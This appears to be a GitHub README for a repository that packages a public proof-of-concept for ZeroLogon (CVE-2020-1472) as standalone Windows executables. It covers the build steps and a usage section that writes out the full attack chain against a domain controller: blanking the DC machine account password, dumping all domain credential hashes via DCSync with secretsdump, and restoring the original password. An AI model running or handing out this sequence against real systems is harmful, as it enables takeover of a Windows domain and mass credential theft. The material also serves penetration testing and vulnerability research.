# ZeroLogon - dirkjanm CVE-2020-1472 static binaries

### Description

This repository contains static standalone binaries for Windows (x64) of
[dirkjanm's CVE-2020-1472 POC](https://github.com/dirkjanm/CVE-2020-1472)
Python scripts: `cve-2020-1472-exploit.exe` and `restorepassword.exe`. All
credit goes to Tom Tervoort for the
[original research](https://www.secura.com/blog/zero-logon) and
Dirk-jan Mollema for the Python scripts.

The build process is heavily based on work from [ropnop's
impacket_static_binaries](https://github.com/ropnop/impacket_static_binaries).
It uses [PyInstaller](http://www.pyinstaller.org/), executed in
[cdrx's docker image](https://github.com/cdrx/docker-pyinstaller).

### Build the binaries yourself

The binaries can be build directly from sources using the provided `Makefile`
and `build_windows.sh` script after installing the `cdrx/pyinstaller-windows`
docker image. The binaries will be placed in the `tmp_build` folder.

```
docker pull cdrx/pyinstaller-windows

make windows
```

### Usage

```
# Sets an empty password for the targeted DC machine account.
cve-2020-1472-exploit.exe "<DC_NETBIOS_NAME>" "<DC_IP>"

# DCSync using the DC machine account.
# Static version of secretsdump.py: https://github.com/ropnop/impacket_static_binaries
secretsdump_windows.exe -just-dc -no-pass "<DOMAIN>/<DC_MACHINE_ACCOUNT$>@<DC_IP>"

# Retrieves the original DC machine account password.
# A secretsdump.exe binary built after impacket's September 15th 2020 update should be used (as it will automatically dump the plaintext machine password hex encoded required for the restoration).
secretsdump_windows.exe -hashes ":<NTLM>" "<DOMAIN>/<Administrator | DA_USERNAME>@<DC_IP>"

# Restores the DC machine account's original password.
restorepassword.exe -target-ip "<DC_IP>" -hexpass "<DC_MACHINE_ACCOUNT_HEX_PASSWORD>" "<DOMAIN>/<DC_HOSTNAME>@<DC_HOSTNAME>"
```

### TODO

  - Linux standalone binaries
